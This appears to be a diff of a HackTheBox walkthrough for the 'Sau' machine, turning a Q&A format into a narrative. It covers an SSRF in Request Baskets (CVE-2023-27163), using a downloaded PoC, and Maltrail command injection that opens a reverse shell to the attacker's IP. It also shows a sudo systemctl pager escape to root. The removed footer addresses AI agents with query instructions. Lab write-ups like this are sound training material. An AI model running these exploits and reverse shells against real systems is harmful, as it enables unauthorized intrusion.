@@ -9,6 +9,7 @@ avatar: assets/htb/sau.png
 tags: [OS Command Injection, Server Side Request Forgery (SSRF), Reconnaissance, SUDO Exploitation, Bash, Maltrail, Request Baskets, Web Application]
 htb_url: https://app.hackthebox.com/machines/Sau
 ---
+
 # Sau
 
 🔗 [Sau](https://www.hackthebox.com/machines/sau)
@@ -51,24 +52,27 @@ CVE-2023-26604 CVE-2023-27163
 
 </details>
 
-## Task 0 - Deploy machine
+## Summary
+
+Sau is an Easy Linux machine running Ubuntu. The attack chain starts with a Request Baskets 1.2.1 instance on port 55555 that is vulnerable to SSRF (CVE-2023-27163), which I use to reach an internal Maltrail v0.53 service that suffers from unauthenticated OS command injection — giving me a reverse shell as the `puma` user. From there a `sudo` misconfiguration around `systemctl` (CVE-2023-26604) lets me escalate to `root`.
+
+## Enumeration
+
+Before scanning, I set up a working layout and add the target to my hosts file. The last `sed` line is just a reminder to clean the entry out of `/etc/hosts` once I'm done with the box.
 
 🎯 Target IP: `<YOUR_IP>`
 
-Create a directory on the Desktop with the machine's name, and inside this directory, create another directory to store the materials and outputs needed to run the machine, including the scans made with nmap.
+```bash
+su
+echo "<YOUR_IP> sau.htb" >> /etc/hosts
 
-## Task 1 - Reconnaissance
-
-<pre class="language-bash"><code class="lang-bash">su
-<strong>echo "<YOUR_IP> sau.htb" >> /etc/hosts
-</strong>
 mkdir -p htb/sau.htb
 cd htb/sau.htb
 mkdir {nmap,content,exploits,scripts}
 # At the end of the room
 # To clean up the last line from the /etc/hosts file
-<strong>sed -i '$ d' /etc/hosts
-</strong></code></pre>
+sed -i '$ d' /etc/hosts
+```
 
 I like to kick off recon with a ping against the target, which confirms connectivity and gives a hint about the OS.
 
@@ -82,7 +86,9 @@ PING sau.htb (<YOUR_IP>) 56(84) bytes of data.
 
 From these three ICMP replies the Time To Live (TTL) comes back at \~64 secs, which points to a \*nix host, since Windows boxes typically report a TTL closer to 128 secs.
 
-### 1.1 - Which is the highest open TCP port on the target machine?
+### Port scanning
+
+A full TCP SYN scan turns up four ports of interest:
 
 ```bash
 nmap -p0- -sS -Pn -vvv sau.htb -oN nmap/tcp_port_scan
@@ -96,13 +102,7 @@ PORT      STATE    SERVICE REASON
 55555/tcp open     unknown syn-ack ttl 63
 ```
 
-<table><thead><tr><th width="154.99999999999997">command</th><th>result</th></tr></thead><tbody><tr><td>sS</td><td>SynScan</td></tr><tr><td>sC</td><td>run default scripts</td></tr><tr><td>sV</td><td>enumerate versions</td></tr><tr><td>A</td><td>aggressive mode</td></tr><tr><td>T4</td><td>run a bit faster</td></tr><tr><td>oN</td><td>output to file with nmap formatting</td></tr></tbody></table>
-
-So we end up with 2 open TCP ports: 22, 55555 and 2 filtered TCP ports: 80, 8338.
-
-55555
-
-### 1.2 - What is the name of the open source software that the application on 55555 is "powered by"?
+So I end up with two open TCP ports (22 and 55555) and two filtered TCP ports (80 and 8338). The highest open TCP port is **55555**.
 
 Next, let's fingerprint the services running on the open ports:
 
@@ -147,7 +147,9 @@ PORT      STATE SERVICE VERSION
 
 Oddly, port 80 shows up as filtered, yet it appears tied to the service listening on port 55555, so let's dig in.
 
-Visiting [`http://sau.htb:55555/web`](http://sau.htb:55555/web) reveals a web app that lets you spin up a basket to capture and review HTTP requests. It's the request-baskets app, version 1.2.1.
+### Web discovery
+
+Visiting [`http://sau.htb:55555/web`](http://sau.htb:55555/web) reveals a web app that lets you spin up a basket to capture and review HTTP requests. It's the request-baskets app, version 1.2.1 — the software the application is "powered by".
 
 ```bash
 whatweb sau.htb:55555
@@ -161,23 +163,13 @@ gobuster dir -u http://sau.htb:55555 -w /usr/share/wordlists/dirb/common.txt
 
 The only directory it turns up is `/web (Status: 200)`, which unfortunately is just our index page.
 
-request-baskets
+## Foothold
 
-### 1.3 - What is the version of request-baskets running on Sau?
+### SSRF in Request Baskets (CVE-2023-27163)
 
-1.2.1
+A search for 'request-baskets 1.2.1' shows the version is affected by a recent CVE exploitable through an [SSRF](https://portswigger.net/web-security/ssrf) attack — **CVE-2023-27163**.
 
-## Task 2 - Find user flag
-
-### 2.1 -  What is the 2023 CVE ID for a Server-Side Request Forgery (SSRF) in this version of request-baskets?
-
-A search for 'request-baskets 1.2.1' shows the version is affected by a recent CVE exploitable through an [SSRF](https://portswigger.net/web-security/ssrf) attack.
-
-CVE-2023-27163
-
-Once we've gone over the [PoC](https://github.com/entr0pie/CVE-2023-27163/blob/main/README.md) and its usage notes:
-
-we can grab CVE-2023-27163.sh and run it to exploit the flaw:
+Once we've gone over the [PoC](https://github.com/entr0pie/CVE-2023-27163/blob/main/README.md) and its usage notes, we can grab CVE-2023-27163.sh and run it to exploit the flaw. I point the forward URL at the internal port 80 that was showing up as filtered:
 
 ```bash
 wget https://raw.githubusercontent.com/entr0pie/CVE-2023-27163/main/CVE-2023-27163.sh
@@ -185,115 +177,64 @@ chmod +x CVE-2023-27163.sh
 ./CVE-2023-27163.sh http://sau.htb:55555 http://sau.htb:80
 ```
 
-now we append the basket value to our URL and at last reach the filtered port 80: <http://sau.htb:55555/hbvoml>
+Now I append the generated basket value to my URL and at last reach the filtered port 80: <http://sau.htb:55555/hbvoml>
 
-<br>
+### OS command injection in Maltrail v0.53
 
-maltrail
-
-### 2.2 -  There is an unauthenticated command injection vulnerability in MailTrail v0.53. What is the relative path targeted by this exploit?
-
-\
-Searching for 'MailTrail v0.53' reveals it's affected by an unauthenticated OS Command Injection (RCE).
-
-The `username` parameter on the **login page** fails to sanitize its input, letting an attacker inject OS commands.
+Browsing through the SSRF-proxied service reveals a Maltrail instance. Searching for 'MailTrail v0.53' reveals it's affected by an unauthenticated OS Command Injection (RCE). The `username` parameter on the **login page** (`/login`) fails to sanitize its input, letting an attacker inject OS commands.
 
 The exploit builds a Base64-encoded reverse shell payload to slip past defenses such as a WAF, IPS or IDS, then ships it to the target URL through a curl command. The payload runs on the target, opening a reverse shell back to the attacker's chosen IP and port.
 
-Attacker machine:
+First I start a listener on the attacker machine:
 
 ```bash
 #first check our IP using ip a
 nc -nvlp 4444
 ```
 
-Target Machine
+Then I fire the exploit against the target, pointing it at the SSRF basket URL:
 
 ```bash
 python3 exploit.py 10.10.14.6 4444 http://sau.htb:55555/hbvoml
 ```
 
-/login
-
-### 2.3 -  What user is the Mailtrack application running as on Sau?
-
-A quick bit of system enumeration (whoami and/or id) tells us which user we're running as on the box
-
-puma
-
-### 2.4 - Submit the flag located in the puma user's home directory.
+The listener catches the shell. A quick bit of system enumeration (`whoami` and/or `id`) confirms the Maltrail application is running as the `puma` user. With that, I grab the user flag from puma's home directory:
 
 ```bash
 cd ~
 ll
 cat user.txt
+8fa7************************c457
 ```
 
-<details>
+## Privilege Escalation
 
-<summary>🚩 Flag 1 (user.txt)</summary>
+### sudo systemctl + pager escape (CVE-2023-26604)
 
-8fa7************************c457
+Now I can move on to privilege escalation to grab the root flag. Running `sudo -l` shows the commands that user `puma` is allowed to run with sudo privileges, pointing me at `/usr/bin/systemctl`.
 
-</details>
+Since `systemctl` is the control utility for the systemd process, I check its version:
 
-## Task 3 - Find root flag
+```bash
+systemctl --version
+```
 
-### 3.1 - What is the full path to the application the user puma can run as root on Sau?
+This returns `systemd 245 (245.4-4ubuntu3.22)`. Searching for 'usr/bin/systemctl status trail.service' surfaces **CVE-2023-26604**, a local privilege escalation that abuses systemctl's pager.
 
-Nice, now we can move on to privilege escalation to grab the root flag.
+Simply by running the allowed command:
 
-Running `sudo -l` shows the commands that user puma is allowed to run with sudo privileges
+```bash
+sudo /usr/bin/systemctl status trail.service
+```
 
-/usr/bin/systemctl
+and typing `!sh` at the pager prompt, I spawn a fresh shell straight away with root privileges. From there I head into the root folder and grab the root flag:
 
-### 3.2 - What is the full version string for the instance of systemd installed on Sau?
-
-Since systemctl is the control utility for the systemd process, we can check its version with: `systemctl --version`
-
-systemd 245 (245.4-4ubuntu3.22)
-
-### 3.3 - What is the CVE ID for a local privilege escalation vulnerability that affects that particular systemd version?
-
-Searching for 'usr/bin/systemctl status trail.service' surfaces this CVE:
-
-along with this handy resource:&#x20;
-
-then, simply by running: `sudo /usr/bin/systemctl status trail.service`
-
-and typing `!sh`  we can spawn a fresh shell straight away with root privileges.
-
-CVE-2023-26604
-
-### 3.4 - Submit the flag located in the root user's home directory.
-
-Let's head into the root folder and grab the root flag!
-
-<br>
-
-<details>
-
-<summary>🚩 Flag 2 (root.txt)</summary>
-
+```bash
+cat /root/root.txt
 c4fc************************aea7
-
-</details>
+```
 
 ---
 
 # Agent Instructions
 This documentation is published with GitBook. GitBook is the documentation platform designed so that both humans and AI agents can read, navigate, and reason over technical content effectively. Learn more at gitbook.com.
-
-## Querying This Documentation
-If you need additional information that is not directly available in this page, you can query the documentation dynamically by asking a question.
-
-Perform an HTTP GET request on the current page URL with the `ask` query parameter:
-
-```
-GET https://dev-angelist.gitbook.io/writeups-and-walkthroughs/hackthebox/sau.md?ask=<question>
-```
-
-The question should be specific, self-contained, and written in natural language.
-The response will contain a direct answer to the question and relevant excerpts and sources from the documentation.
-
-Use this mechanism when the answer is not explicitly present in the current page, you need clarification or additional context, or you want to retrieve related documentation sections.
